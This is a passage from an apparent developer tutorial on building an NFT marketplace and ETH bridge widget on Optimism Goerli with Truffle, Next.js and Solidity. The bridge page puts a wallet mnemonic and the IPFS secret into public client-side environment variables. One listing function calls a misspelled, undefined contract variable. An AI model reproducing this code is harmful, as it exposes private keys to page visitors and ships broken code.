migrations \u251c\u2500\u2500 node_modules \u251c\u2500\u2500 package-lock.json \u251c\u2500\u2500 package.json \u251c\u2500\u2500 scripts \u251c\u2500\u2500 test \u251c\u2500\u2500 truffle-config.js \u2514\u2500\u2500 truffle-config.ovm.js We also don't need the Greeter contracts, so let's go ahead and delete the related files: GreeterL1.sol , GreeterL2.sol , Greeter.sol , all the migrations files, and goerli_bridge_message.mjs . Create client folder using Next.js \u00b6 To set up the frontend, we'll be using Next.js and Tailwind for our CSS. To do so, call: npx create-next-app@latest client Then, to add Tailwind to your project: cd client npm install -D tailwindcss@latest postcss@latest autoprefixer@latest npx tailwindcss init -p Edit tailwind.config.js module . exports = { content : [ \"./pages/**/*.{js,ts,jsx,tsx}\" , \"./components/**/*.{js,ts,jsx,tsx}\" , ], theme : { extend : {}, }, plugins : [], } And replace the code from styles/global.css @ tailwind base ; @ tailwind components ; @ tailwind utilities ; Nice! Now that we have our folder structure organized, let's first create our marketplace contracts. Create an NFT and Marketplace smart contract \u00b6 In this tutorial, we'll be using the same contracts and frontend as the Optimism NFT Marketplace , so if you want any in depth explanation of the smart contract code, please reference the NFT smart contract section and the marketplace smart contract section . To start, we will create two new Optimism contracts in the contracts/optimism folder. We also need @openzeppelin/contracts to inherit. To this, we can simply call: cd ../truffle npm i @openzeppelin/contracts truffle create contract OptimismNFT --config truffle-config.ovm.js truffle create contract OptimismMarketplace --config truffle-config.ovm.js Then, populate the contracts with the corresponding code from the previous tutorial: Code // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; import \"@openzeppelin/contracts/token/ERC721/ERC721.sol\" ; import \"@openzeppelin/contracts/token/ERC721/extensions/ERC721URIStorage.sol\" ; import \"@openzeppelin/contracts/utils/Counters.sol\" ; contract OptimismNFT is ERC721URIStorage { using Counters for Counters . Counter ; Counters . Counter private _tokenIds ; address marketplaceContract ; event NFTMinted ( uint256 ); constructor ( address _marketplaceContract ) ERC721 ( \"Optimism NFT\" , \"ON\" ) { marketplaceContract = _marketplaceContract ; } function mint ( string memory _tokenURI ) public { _tokenIds . increment (); uint256 newTokenId = _tokenIds . current (); _safeMint ( msg . sender , newTokenId ); _setTokenURI ( newTokenId , _tokenURI ); setApprovalForAll ( marketplaceContract , true ); emit NFTMinted ( newTokenId ); } } Code // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; import \"@openzeppelin/contracts/utils/Counters.sol\" ; import \"@openzeppelin/contracts/token/ERC721/ERC721.sol\" ; import \"@openzeppelin/contracts/security/ReentrancyGuard.sol\" ; contract OptimismMarketplace is ReentrancyGuard { using Counters for Counters . Counter ; Counters . Counter private _nftsSold ; Counters . Counter private _nftCount ; uint256 public LISTING_FEE = 0.0001 ether ; address payable private _marketOwner ; mapping ( uint256 => NFT ) private _idToNFT ; struct NFT { address nftContract ; uint256 tokenId ; address payable seller ; address payable owner ; uint256 price ; bool listed ; } event NFTListed ( address nftContract , uint256 tokenId , address seller , address owner , uint256 price ); event NFTSold ( address nftContract , uint256 tokenId , address seller , address owner , uint256 price ); constructor () { _marketOwner = payable ( msg . sender ); } // List the NFT on the marketplace function listNft ( address _nftContract , uint256 _tokenId , uint256 _price ) public payable nonReentrant { require ( _price > 0 , \"Price must be at least 1 wei\" ); require ( msg . value == LISTING_FEE , \"Not enough ether for listing fee\" ); IERC721 ( _nftContract ). transferFrom ( msg . sender , address ( this ), _tokenId ); _nftCount . increment (); _idToNFT [ _tokenId ] = NFT ( _nftContract , _tokenId , payable ( msg . sender ), payable ( address ( this )), _price , true ); emit NFTListed ( _nftContract , _tokenId , msg . sender , address ( this ), _price ); } // Buy an NFT function buyNft ( address _nftContract , uint256 _tokenId ) public payable nonReentrant { NFT storage nft = _idToNFT [ _tokenId ]; require ( msg . value >= nft . price , \"Not enough ether to cover asking price\" ); address payable buyer = payable ( msg . sender ); payable ( nft . seller ). transfer ( msg . value ); IERC721 ( _nftContract ). transferFrom ( address ( this ), buyer , nft . tokenId ); _marketOwner . transfer ( LISTING_FEE ); nft . owner = buyer ; nft . listed = false ; _nftsSold . increment (); emit NFTSold ( _nftContract , nft . tokenId , nft . seller , buyer , msg . value ); } // Resell an NFT purchased from the marketplace function resellNft ( address _nftContract , uint256 _tokenId , uint256 _price ) public payable nonReentrant { require ( _price > 0 , \"Price must be at least 1 wei\" ); require ( msg . value == LISTING_FEE , \"Not enough ether for listing fee\" ); IERC721 ( _nftContract ). transferFrom ( msg . sender , address ( this ), _tokenId ); NFT storage nft = _idToNFT [ _tokenId ]; nft . seller = payable ( msg . sender ); nft . owner = payable ( address ( this )); nft . listed = true ; nft . price = _price ; _nftsSold . decrement (); emit NFTListed ( _nftContract , _tokenId , msg . sender , address ( this ), _price ); } function getListingFee () public view returns ( uint256 ) { return LISTING_FEE ; } function getListedNfts () public view returns ( NFT [] memory ) { uint256 nftCount = _nftCount . current (); uint256 unsoldNftsCount = nftCount - _nftsSold . current (); NFT [] memory nfts = new NFT []( unsoldNftsCount ); uint nftsIndex = 0 ; for ( uint i = 0 ; i < nftCount ; i ++ ) { if ( _idToNFT [ i + 1 ]. listed ) { nfts [ nftsIndex ] = _idToNFT [ i + 1 ]; nftsIndex ++ ; } } return nfts ; } function getMyNfts () public view returns ( NFT [] memory ) { uint nftCount = _nftCount . current (); uint myNftCount = 0 ; for ( uint i = 0 ; i < nftCount ; i ++ ) { if ( _idToNFT [ i + 1 ]. owner == msg . sender ) { myNftCount ++ ; } } NFT [] memory nfts = new NFT []( myNftCount ); uint nftsIndex = 0 ; for ( uint i = 0 ; i < nftCount ; i ++ ) { if ( _idToNFT [ i + 1 ]. owner == msg . sender ) { nfts [ nftsIndex ] = _idToNFT [ i + 1 ]; nftsIndex ++ ; } } return nfts ; } function getMyListedNfts () public view returns ( NFT [] memory ) { uint nftCount = _nftCount . current (); uint myListedNftCount = 0 ; for ( uint i = 0 ; i < nftCount ; i ++ ) { if ( _idToNFT [ i + 1 ]. seller == msg . sender && _idToNFT [ i + 1 ]. listed ) { myListedNftCount ++ ; } } NFT [] memory nfts = new NFT []( myListedNftCount ); uint nftsIndex = 0 ; for ( uint i = 0 ; i < nftCount ; i ++ ) { if ( _idToNFT [ i + 1 ]. seller == msg . sender && _idToNFT [ i + 1 ]. listed ) { nfts [ nftsIndex ] = _idToNFT [ i + 1 ]; nftsIndex ++ ; } } return nfts ; } } Modify truffle-config.ovm.js \u00b6 Now that we want to reference our new Optimsim contracts in the client, we need to change the build path in truffle-config.ovm.js to add the contract ABIs into a folder in client . Modify the build directory in truffle-config.ovm.js as follows: contracts_build_directory : \"../client/contracts/optimism-contracts\" , Migrate the new Optimism contracts \u00b6 Now, let's deploy the newly created Optimism contracts. To do so, create a migrations file 1_deploy_contracts.js . Then populate as so: var OptimismNFT = artifacts . require ( \"OptimismNFT\" ); var OptimismMarketplace = artifacts . require ( \"OptimismMarketplace\" ); module . exports = async function ( deployer ) { await deployer . deploy ( OptimismMarketplace ); const marketplace = await OptimismMarketplace . deployed (); await deployer . deploy ( OptimismNFT , marketplace . address ); } Since we are only deploying these two contracts, which are both on Optimism, let's deploy using Truffle Dashboard! First, let's add the Optimism Goerli network to our MetaMask wallet. You should add this network information to your MetaMask wallet: Network name : Optimism Goerli New RPC URL : https://optimism-goerli.infura.io/v3/ Chain ID : 420 Currency Symbol : ETH Block explorer URL : https://blockscout.com/optimism/goerli/ Now, to migrate your contracts first start up dashboard on localhost:24012 : truffle dashboard Make sure the Optimism Goerli network is selected on MetaMask. Then simply call: truffle migrate --config truffle-config.ovm.js --network dashboard Truffle dashboard will ask you sign to transactions: one for deploying OptimismMarketplace and one for deploying OptimismNFT . You should be able to see the built contracts in client/contract/optimism-contracts . At this point, you should test the contracts. We won't be going over it in this tutorial, but you can follow the instructions here . Now, let's get into the client portion! Create an Infura IPFS project \u00b6 You'll need Infura IPFS account and dedicated gateway to upload your NFT metadata. To create a IPFS project, select create IPFS project. Then, you'll need to create a unique gateway name. In this project, we'll call it optimism-demo . You will need to give your own dedicated gateway with its own unique name. Create Marketplace frontend pages \u00b6 Again, we'll just be using the frontend from our previous tutorial. If you want to do a deeper dive, read this section. Otherwise, to add the front end you'll need to: Install some packages to get our client up and running: cd ../client npm install axios npm install web3modal npm install web3 npm install ipfs-http-client Then, we need to create or edit 6 files that sit under client/pages : _app.js \u00b6 This file organizes the link routing Code import '../styles/globals.css' import Link from 'next/link' function MyApp ({ Component , pageProps }) { return ( < div > < nav className = \"border-b p-6\" > < p className = \"text-4xl font-bold\" > Optimism Marketplace < /p> < div className = \"flex mt-4\" > < Link href = \"/\" > < a className = \"mr-4 text-teal-400\" > Home < /a> < /Link> < Link href = \"/create-and-list-nft\" > < a className = \"mr-6 text-teal-400\" > Sell a new NFT < /a> < /Link> < Link href = \"/my-nfts\" > < a className = \"mr-6 text-teal-400\" > My NFTs < /a> < /Link> < Link href = \"/my-listed-nfts\" > < a className = \"mr-6 text-teal-400\" > My Listed NFTs < /a> < /Link> < /div> < /nav> < Component {... pageProps } /> < /div> ) } export default MyApp index.js \u00b6 Thie file is the Home tab, where a user can see and buy all of the listed NFTs. Code import Web3 from 'web3' ; import Web3Modal from 'web3modal' ; import { useEffect , useState } from 'react' ; import axios from 'axios' ; import OptimismMarketplace from '../contracts/optimism-contracts/OptimismMarketplace.json' import OptimismNFT from '../contracts/optimism-contracts/OptimismNFT.json' export default function Home () { const [ nfts , setNfts ] = useState ([]) const [ loadingState , setLoadingState ] = useState ( 'not-loaded' ) useEffect (() => { loadNFTs () }, []) async function loadNFTs () { const web3Modal = new Web3Modal () const provider = await web3Modal . connect () const web3 = new Web3 ( provider ) const networkId = await web3 . eth . net . getId () // Get all listed NFTs const marketPlaceContract = new web3 . eth . Contract ( OptimismMarketplace . abi , OptimismMarketplace . networks [ networkId ]. address ) const listings = await marketPlaceContract . methods . getListedNfts (). call () // Iterate over the listed NFTs and retrieve their metadata const nfts = await Promise . all ( listings . map ( async ( i ) => { try { const optimismNFTContract = new web3 . eth . Contract ( OptimismNFT . abi , OptimismNFT . networks [ networkId ]. address ) const tokenURI = await optimismNFTContract . methods . tokenURI ( i . tokenId ). call () const meta = await axios . get ( tokenURI ) const nft = { price : i . price , tokenId : i . tokenId , seller : i . seller , owner : i . buyer , image : meta . data . image , name : meta . data . name , description : meta . data . description , } return nft } catch ( err ) { console . log ( err ) return null } })) setNfts ( nfts . filter ( nft => nft !== null )) setLoadingState ( 'loaded' ) } async function buyNft ( nft ) { const web3Modal = new Web3Modal () const provider = await web3Modal . connect () const web3 = new Web3 ( provider ) const networkId = await web3 . eth . net . getId (); const marketPlaceContract = new web3 . eth . Contract ( OptimismMarketplace . abi , OptimismMarketplace . networks [ networkId ]. address ); const accounts = await web3 . eth . getAccounts (); await marketPlaceContract . methods . buyNft ( OptimismNFT . networks [ networkId ]. address , nft . tokenId ). send ({ from : accounts [ 0 ], value : nft . price }); loadNFTs () } if ( loadingState === 'loaded' && ! nfts . length ) { return ( < h1 className = \"px-20 py-10 text-3xl\" > No NFTs available !< /h1>) } else { return ( < div className = \"flex justify-center\" > < div className = \"px-4\" style = { { maxWidth : '1600px' } } > < div className = \"grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4 pt-4\" > { nfts . map (( nft , i ) => ( < div key = { i } className = \"border shadow rounded-xl overflow-hidden\" > < img src = { nft . image } /> < div className = \"p-4\" > < p style = { { height : '64px' } } className = \"text-2xl font-semibold\" > { nft . name } < /p> < div style = { { height : '70px' , overflow : 'hidden' } } > < p className = \"text-gray-400\" > { nft . description } < /p> < /div> < /div> < div className = \"p-4 bg-teal-300\" > < p className = \"text-2xl font-bold text-white\" > { Web3 . utils . fromWei ( nft . price , \"ether\" )} ETH < /p> < button className = \"mt-4 w-full bg-teal-400 text-white font-bold py-2 px-12 rounded\" onClick = {() => buyNft ( nft )} > Buy < /button> < /div> < /div> )) } < /div> < /div> < /div> ) } } create-and-list-nft.js \u00b6 This is the Sell tab, where a user can create and list an NFT. Make sure you replace with the dedicated gateway name you create in your IPFS project on Infura. You'll also need to add in your IPFS API and Secret to create our IPFS client. To do so, create .env.local in your client folder. Then, populate it with these values: NEXT_PUBLIC_IPFS_SECRET = NEXT_PUBLIC_IPFS_KEY = NEXT_PUBLIC_IPFS_UNIQUE_SUBDOMAIN = Don't forget to add .env.local to your .gitignore ! Then, copy paste this code into create-and-list-nft.js : Code import { useState } from 'react' import Web3 from 'web3' import Web3Modal from 'web3modal' import { useRouter } from 'next/router' import { create as ipfsHttpClient } from 'ipfs-http-client' import OptimismMarketplace from '../contracts/optimism-contracts/OptimismMarketplace.json' import OptimismNFT from '../contracts/optimism-contracts/OptimismNFT.json' const projectId = process . env [ \"NEXT_PUBLIC_IPFS_KEY\" ]; const projectSecret = process . env [ \"NEXT_PUBLIC_IPFS_SECRET\" ]; const auth = 'Basic ' + Buffer . from ( projectId + ':' + projectSecret ). toString ( 'base64' ); const client = ipfsHttpClient ({ host : 'ipfs.infura.io' , port : 5001 , protocol : 'https' , headers : { authorization : auth , }, }); const IPFSGateway = `https:// ${ process . env [ \"NEXT_PUBLIC_IPFS_UNIQUE_SUBDOMAIN\" ] } .infura-ipfs.io/ipfs/` export default function CreateItem () { const [ fileUrl , setFileUrl ] = useState ( null ) const [ formInput , updateFormInput ] = useState ({ price : '' , name : '' , description : '' }) const router = useRouter () async function onChange ( e ) { // upload image to IPFS const file = e . target . files [ 0 ] try { const added = await client . add ( file , { progress : ( prog ) => console . log ( `received: ${ prog } ` ) } ) const url = ` ${ IPFSGateway }${ added . path } ` setFileUrl ( url ) } catch ( error ) { console . log ( 'Error uploading file: ' , error ) } } async function uploadToIPFS () { const { name , description , price } = formInput if ( ! name || ! description || ! price || ! fileUrl ) { return } else { // first, upload metadata to IPFS const data = JSON . stringify ({ name , description , image : fileUrl }) try { const added = await client . add ( data ) console . log ( 'added: ' , added ) const url = ` ${ IPFSGateway }${ added . path } ` // after metadata is uploaded to IPFS, return the URL to use it in the transaction return url } catch ( error ) { console . log ( 'Error uploading file: ' , error ) } } } async function listNFTForSale () { const web3Modal = new Web3Modal () const provider = await web3Modal . connect () const web3 = new Web3 ( provider ) const url = await uploadToIPFS () const networkId = await web3 . eth . net . getId () // Mint the NFT const optimismNFTContractAddress = OptimismNFT . networks [ networkId ]. address const optimismNFTContract = new web3 . eth . Contract ( OptimismNFT . abi , optimismNFTContractAddress ) const accounts = await web3 . eth . getAccounts () const marketPlaceContract = new web3 . eth . Contract ( OptimismMarketplace . abi , OptimismMarketplace . networks [ networkId ]. address ) let listingFee = await marketPlaceContract . methods . getListingFee (). call () listingFee = listingFee . toString () optimismNFTontract . methods . mint ( url ). send ({ from : accounts [ 0 ] }). on ( 'receipt' , function ( receipt ) { console . log ( 'minted' ); // List the NFT const tokenId = receipt . events . NFTMinted . returnValues [ 0 ]; marketPlaceContract . methods . listNft ( optimismNFTContractAddress , tokenId , Web3 . utils . toWei ( formInput . price , \"ether\" )) . send ({ from : accounts [ 0 ], value : listingFee }). on ( 'receipt' , function () { console . log ( 'listed' ) router . push ( '/' ) }); }); } return ( < div className = \"flex justify-center\" > < div className = \"w-1/2 flex flex-col pb-12\" > < input placeholder = \"Asset Name\" className = \"focus:outline-none focus:ring-teal-400 focus:border-teal-400 mt-8 border rounded p-4\" onChange = { e => updateFormInput ({ ... formInput , name : e . target . value })} /> < textarea placeholder = \"Asset Description\" className = \"focus:outline-none focus:ring-teal-400 focus:border-teal-400 mt-2 border rounded p-4\" onChange = { e => updateFormInput ({ ... formInput , description : e . target . value })} /> < input placeholder = \"Asset Price in Eth\" className = \"focus:outline-none focus:ring-teal-400 focus:border-teal-400 mt-2 border rounded p-4\" onChange = { e => updateFormInput ({ ... formInput , price : e . target . value })} /> < input type = \"file\" name = \"Asset\" className = \"my-4\" onChange = { onChange } /> { fileUrl && ( < img className = \"rounded mt-4\" width = \"350\" src = { fileUrl } /> ) } < button onClick = { listNFTForSale } className = \"focus:ring-teal-400 focus:border-teal-400 font-bold mt-4 bg-teal-400 text-white rounded p-4 shadow-lg\" > Mint and list NFT < /button> < /div> < /div> ) } my-nfts.js \u00b6 This is the My NFTs tab, where the user can see the NFTs they own and choose to resell. Code import Web3 from 'web3' ; import { useEffect , useState } from 'react' import axios from 'axios' import Web3Modal from 'web3modal' import { useRouter } from 'next/router' import OptimismMarketplace from '../contracts/optimism-contracts/OptimismMarketplace.json' ; import OptimismNFT from '../contracts/optimism-contracts/OptimismNFT.json' ; export default function MyAssets () { const [ nfts , setNfts ] = useState ([]) const [ loadingState , setLoadingState ] = useState ( 'not-loaded' ) const router = useRouter () useEffect (() => { loadNFTs () }, []) async function loadNFTs () { const web3Modal = new Web3Modal () const provider = await web3Modal . connect () const web3 = new Web3 ( provider ) const networkId = await web3 . eth . net . getId () const marketPlaceContract = new web3 . eth . Contract ( OptimismMarketplace . abi , OptimismMarketplace . networks [ networkId ]. address ) const optimismNFTContractAddress = OptimismNFT . networks [ networkId ]. address const optimismNFTContract = new web3 . eth . Contract ( OptimismNFT . abi , optimismNFTContractAddress ) const accounts = await web3 . eth . getAccounts () const data = await marketPlaceContract . methods . getMyNfts (). call ({ from : accounts [ 0 ]}) const nfts = await Promise . all ( data . map ( async i => { try { const tokenURI = await optimismNFTContract . methods . tokenURI ( i . tokenId ). call () const meta = await axios . get ( tokenURI ) let nft = { price : i . price , tokenId : i . tokenId , seller : i . seller , owner : i . buyer , image : meta . data . image , name : meta . data . name , description : meta . data . description , tokenURI : tokenURI } return nft } catch ( err ) { console . log ( err ) return null } })) setNfts ( nfts . filter ( nft => nft !== null )) setLoadingState ( 'loaded' ) } function listNFT ( nft ) { router . push ( `/resell-nft?id= ${ nft . tokenId } &tokenURI= ${ nft . tokenURI } ` ) } if ( loadingState === 'loaded' && ! nfts . length ) { return ( < h1 className = \"py-10 px-20 text-3xl\" > No NFTs owned < /h1>); } else { return ( < div className = \"flex justify-center\" > < div className = \"p-4\" > < div className = \"grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4 pt-4\" > { nfts . map (( nft , i ) => ( < div key = { i } className = \"border shadow rounded-xl overflow-hidden\" > < img src = { nft . image } className = \"rounded\" /> < div className = \"p-4\" > < p style = { { height : '64px' } } className = \"text-2xl font-semibold\" > { nft . name } < /p> < div style = { { height : '70px' , overflow : 'hidden' } } > < p className = \"text-gray-400\" > { nft . description } < /p> < /div> < /div> < div className = \"p-4 bg-teal-300\" > < p className = \"text-2xl font-bold text-white\" > Price - { Web3 . utils . fromWei ( nft . price , \"ether\" )} Eth < /p> < button className = \"mt-4 w-full bg-teal-400 text-white font-bold py-2 px-12 rounded\" onClick = {() => listNFT ( nft )} > List < /button> < /div> < /div> )) } < /div> < /div> < /div> ); } } resell-nft.js \u00b6 This is the page the user is directed to to resell their NFTs. Code import { useEffect , useState } from 'react' import Web3 from 'web3' import { useRouter } from 'next/router' import axios from 'axios' import Web3Modal from 'web3modal' import OptimismMarketplace from '../contracts/optimism-contracts/OptimismMarketplace.json' import OptimismNFT from '../contracts/optimism-contracts/OptimismNFT.json' export default function ResellNFT () { const [ formInput , updateFormInput ] = useState ({ price : '' , image : '' }) const router = useRouter () const { id , tokenURI } = router . query const { image , price } = formInput useEffect (() => { fetchNFT () }, [ id ]) async function fetchNFT () { if ( ! tokenURI ) { return } else { const meta = await axios . get ( tokenURI ) updateFormInput ( state => ({ ... state , image : meta . data . image })) } } async function listNFTForSale () { if ( ! price ) { return } else { const web3Modal = new Web3Modal () const provider = await web3Modal . connect () const web3 = new Web3 ( provider ) const networkId = await web3 . eth . net . getId () const marketPlaceContract = new web3 . eth . Contract ( OptimismMarketplace . abi , OptimismMarketplace . networks [ networkId ]. address ) let listingFee = await marketPlaceContract . methods . getListingFee (). call () listingFee = listingFee . toString () const accounts = await web3 . eth . getAccounts () marketPlaceContract . methods . resellNft ( OptimismNFT . networks [ networkId ]. address , id , Web3 . utils . toWei ( formInput . price , \"ether\" )) . send ({ from : accounts [ 0 ], value : listingFee }). on ( 'receipt' , function () { router . push ( '/' ) }); } } return ( < div className = \"flex justify-center\" > < div className = \"w-1/2 flex flex-col pb-12\" > < input placeholder = \"Asset Price in Eth\" className = \"mt-2 border rounded p-4\" onChange = { e => updateFormInput ({ ... formInput , price : e . target . value })} /> { image && ( < img className = \"rounded mt-4\" width = \"350\" src = { image } /> ) } < button onClick = { listNFTForSale } className = \"font-bold mt-4 bg-teal-400 text-white rounded p-4 shadow-lg\" > List NFT < /button> < /div> < /div> ) } my-listed-nfts.js \u00b6 Code This is the My Listed NFTs tab, where users can see what NFTs they have listed for sale. import Web3 from 'web3' ; import { useEffect , useState } from 'react' ; import axios from 'axios' ; import Web3Modal from 'web3modal' ; import OptimismMarketplace from '../contracts/optimism-contracts/OptimismMarketplace.json' ; import OptimismNFT from '../contracts/optimism-contracts/OptimismNFT.json' ; export default function CreatorDashboard () { const [ nfts , setNfts ] = useState ([]) const [ loadingState , setLoadingState ] = useState ( 'not-loaded' ) useEffect (() => { loadNFTs () }, []) async function loadNFTs () { const web3Modal = new Web3Modal () const provider = await web3Modal . connect () const web3 = new Web3 ( provider ) const networkId = await web3 . eth . net . getId () // Get listed NFTs const marketPlaceContract = new web3 . eth . Contract ( OptimismMarketplace . abi , OptimismMarketplace . networks [ networkId ]. address ) const accounts = await web3 . eth . getAccounts () const listings = await marketPlaceContract . methods . getMyListedNfts (). call ({ from : accounts [ 0 ]}) // Iterate over my listed NFTs and retrieve their metadata const nfts = await Promise . all ( listings . map ( async i => { try { const optimismNFTContract = new web3 . eth . Contract ( OptimismNFT . abi , OptimismNFT . networks [ networkId ]. address ) const tokenURI = await optimismNFTContract . methods . tokenURI ( i . tokenId ). call (); const meta = await axios . get ( tokenURI ); let item = { price : i . price , tokenId : i . tokenId , seller : i . seller , owner : i . owner , image : meta . data . image , } return item } catch ( err ) { console . log ( err ) return null } })) setNfts ( nfts . filter ( nft => nft !== null )) setLoadingState ( 'loaded' ) } if ( loadingState === 'loaded' && ! nfts . length ) { return ( < h1 className = \"py-10 px-20 text-3xl\" > No NFTs listed < /h1>) } else { return ( < div > < div className = \"p-4\" > < h2 className = \"text-2xl py-2\" > Items Listed < /h2> < div className = \"grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4 pt-4\" > { nfts . map (( nft , i ) => ( < div key = { i } className = \"border shadow rounded-xl overflow-hidden\" > < img src = { nft . image } className = \"rounded\" /> < div className = \"p-4 bg-teal-300\" > < p className = \"text-2xl font-bold text-white\" > Price - { Web3 . utils . fromWei ( nft . price , \"ether\" )} Eth < /p> < /div> < /div> )) } < /div> < /div> < /div> ) } } Add bridge widget \u00b6 Now, let's create a new page under pages called goerli-bridge.js . We'll need some additional packages: npm i react-async-hook npm i @eth-optimism/sdk npm i ethers Now, we'll need to add our infura key and goerli mnemonic to the .env.local file as well: NEXT_PUBLIC_INFURA_KEY = NEXT_PUBLIC_GOERLI_MNEMONIC = Add the following code to goerli-bridge.js : Code import { useRef , useEffect } from \"react\" ; import { useAsyncCallback } from 'react-async-hook' ; const optimismSDK = require ( \"@eth-optimism/sdk\" ); const ethers = require ( \"ethers\" ); const goerliMnemonic = process . env [ \"NEXT_PUBLIC_GOERLI_MNEMONIC\" ]; const infuraKey = process . env [ \"NEXT_PUBLIC_INFURA_KEY\" ]; const l1Url = \"https://goerli.infura.io/v3/\" + infuraKey ; const l2Url = \"https://optimism-goerli.infura.io/v3/\" + infuraKey ; // getSigners // Initializes ethers providers and returns wallets. const l1RpcProvider = new ethers . providers . JsonRpcProvider ( l1Url ); const l2RpcProvider = new ethers . providers . JsonRpcProvider ( l2Url ); const hdNode = ethers . utils . HDNode . fromMnemonic ( goerliMnemonic ); const privateKey = hdNode . derivePath ( ethers . utils . defaultPath ). privateKey ; const [ l1Signer , l2Signer ] = [ new ethers . Wallet ( privateKey , l1RpcProvider ), new ethers . Wallet ( privateKey , l2RpcProvider ) ]; // Initializes Optimism SDK's Cross Chain Messenger const crossChainMessenger = new optimismSDK . CrossChainMessenger ({ l1ChainId : 5 , // Goerli value, 1 for mainnet l2ChainId : 420 , // Goerli value, 10 for mainnet l1SignerOrProvider : l1Signer , l2SignerOrProvider : l2Signer }); const getL1Eth = async () => { console . log ( \"getL1Eth\" ); return ethers . utils . formatEther ( ( await crossChainMessenger . l1Signer . getBalance ()) . toString () ); }; const getL2Eth = async () => { console . log ( \"getL2Eth\" ); return ethers . utils . formatEther ( ( await crossChainMessenger . l2Signer . getBalance ()) . toString () ); }; const Bridge = () => { const l1Balance = useAsyncCallback ( getL1Eth , []); const l2Balance = useAsyncCallback ( getL2Eth , []); const depositRef = useRef ( null ); const withdrawRef = useRef ( null ); useEffect (() => { l1Balance . execute (); l2Balance . execute (); }, [ l1Balance . execute , l2Balance . execute ]); const withdrawEth = async () => { console . log ( \"Withdraw ETH\" ); const start = new Date (); const response = await crossChainMessenger . withdrawETH ( ethers . utils . parseEther ( withdrawRef . current . value )); console . log ( `Transaction hash (on L2): ${ response . hash } ` ); await response . wait (); console . log ( \"Waiting for status to change to IN_CHALLENGE_PERIOD\" ); console . log ( `Time so far ${ ( new Date () - start ) / 1000 } seconds` ); await crossChainMessenger . waitForMessageStatus ( response . hash , optimismSDK . MessageStatus . IN_CHALLENGE_PERIOD ); console . log ( \"In the challenge period, waiting for status READY_FOR_RELAY\" ); console . log ( `Time so far ${ ( new Date () - start ) / 1000 } seconds` ); await crossChainMessenger . waitForMessageStatus ( response . hash , optimismSDK . MessageStatus . READY_FOR_RELAY ); console . log ( \"Ready for relay, finalizing message now\" ); console . log ( `Time so far ${ ( new Date () - start ) / 1000 } seconds` ); await crossChainMessenger . finalizeMessage ( response ); console . log ( \"Waiting for status to change to RELAYED\" ); console . log ( `Time so far ${ ( new Date () - start ) / 1000 } seconds` ); await crossChainMessenger . waitForMessageStatus ( response , optimismSDK . MessageStatus . RELAYED ); console . log ( `withdrawETH took ${ ( new Date () - start ) / 1000 } seconds\\n\\n\\n` ); l1Balance . execute (); l2Balance . execute (); }; const depositEth = async () => { console . log ( \"Deposit ETH\" ); const start = new Date (); const response = await crossChainMessenger . depositETH ( ethers . utils . parseEther ( depositRef . current . value )); console . log ( `Transaction hash (on L1): ${ response . hash } ` ); await response . wait (); console . log ( \"Waiting for status to change to RELAYED\" ); console . log ( `Time so far ${ ( new Date () - start ) / 1000 } seconds` ); await crossChainMessenger . waitForMessageStatus ( response . hash , optimismSDK . MessageStatus . RELAYED ); console . log ( `depositETH took ${ ( new Date () - start ) / 1000 } seconds\\n\\n` ); l1Balance . execute (); l2Balance . execute (); }; return ( < div className = \"py-8 px-8 m-8 max-w-md mx-auto bg-white rounded-xl shadow-lg space-y-2 sm:py-4 sm:flex sm:items-center sm:space-y-0 sm:space-x-6\" > < div className = \"text-center space-y-2 sm:text-left\" > < div className = \"space-y-0.5\" >< /div> < div > < div className = \"txt-lg font-bold\" > Bridge your ETH !< /div> < /div> < div className = \"my-4 space-y-4\" > < input placeholder = \"ETH bridged to Optimism\" ref = { depositRef } type = \"text\" className = \"focus:outline-none bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-teal-400 focus:border-teal-400 block w-full p-2.5\" /> < button onClick = { depositEth } className = \"px-4 py-1 text-sm text-teal-400 font-semibold rounded-lg border border-teal-400 hover:text-white hover:bg-teal-400 hover:border-transparent\" > Deposit < /button> { l1Balance . loading && < div > Loading Goerli Eth Balance ... < /div>} { l1Balance . error && < div className = \"font-semibold\" > Error : { l1Balance . error . message } < /div>} { l1Balance . result && ( < div > < span className = \"text-slate-500\" > Current Goerli Eth Balance : < /span> < span className = \"font-semibold\" > { l1Balance . result } < /span> < /div> ) } < input placeholder = \"ETH bridged to Ethereum\" ref = { withdrawRef } type = \"text\" className = \"focus:outline-none bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-teal-400 focus:border-teal-400 block w-full p-2.5\" /> < button onClick = { withdrawEth } className = \"px-4 py-1 text-sm text-teal-400 font-semibold rounded-lg border border-teal-400 hover:text-white hover:bg-teal-400 hover:border-transparent\" > Withdraw < /button> { l2Balance . loading && < div > Loading Optimism Goerli Eth Balance ... < /div>} { l2Balance . error && < div className = \"font-semibold\" > Error : { l2Balance . error . message } < /div>} { l2Balance . result && ( < div > < span className = \"text-slate-500\" > Current Optimism Goerli Eth Balance : < /span> < span className = \"font-semibold\" > { l2Balance . result } < /span> < /div> ) } < /div> < /div> < /div> ); } export default Bridge ; The things to note here is that we effectively copy pasted the relevant depositETH and withdrawETH content from scripts/goerli_bridge_value.js . There are a few key differences though, namely: We split reportBalances into getL1Eth and getL2Eth to be displayed on our web page. We needed to convert the input values for withdraw and deposit from text to BigNumber ( ethers.utils.parseEther(withdrawRef.current.value) and ethers.utils.parseEther(depositRef.current.value) ) Finally, the last piece is to make sure we add this page to our list of pages in _app.js ! To the end of the links, add: < Link href = \"/goerli-bridge\" > < a className = \"mr-6 text-teal-400\" > Goerli Bridge < /a> < /Link> Now, everything should be hooked up! Run npm run dev from the client folder and try it out! Future Extensions \u00b6 And there you have it! You've created a Marketplace DApp on Optimism and embedded an ETH bridge into the UI. It is important to note that we only covered bridging ETH on Goerli. Possible extensions include allowing the user to choose the desired network, or bridging other ERC20 tokens. Alternatively, consider creating a chat bot, that incorporates our Greeter contracts for sending messages. If you want to talk about this content, make suggestions for what you'd like to see or ask questions about the series, join our Discord ! Lastly, don't forget to follow us on Twitter for the latest updates on all things Truffle.", "title": "Web3 Unleashed: Optimistic rollups and bridging with Optimism"}, {"location": "guides/optimism-bridge-widget/#web3-unleashed-optimistic-rollups-and-bridging-with-optimism", "text": "Written by Emily Lin Last updated 11/03/2022", "title": 